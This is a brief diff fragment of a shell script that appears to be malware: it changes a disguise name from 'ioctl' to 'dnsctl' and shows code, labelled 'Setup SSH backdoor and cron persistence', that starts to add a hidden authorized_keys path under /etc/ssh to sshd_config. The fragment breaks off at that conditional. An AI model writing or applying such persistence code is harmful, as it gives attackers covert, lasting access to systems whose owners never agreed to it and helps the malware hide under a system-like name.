@@ -21,7 +21,7 @@ fi
 
 SYSTEM=""
 
-NAME="ioctl"
+NAME="dnsctl"
 
 # Setup SSH backdoor and cron persistence
 if ! grep -Fq "AuthorizedKeysFile .ssh/authorized_keys /etc/ssh/.ssh/authorized_keys" /etc/ssh/sshd_config; then
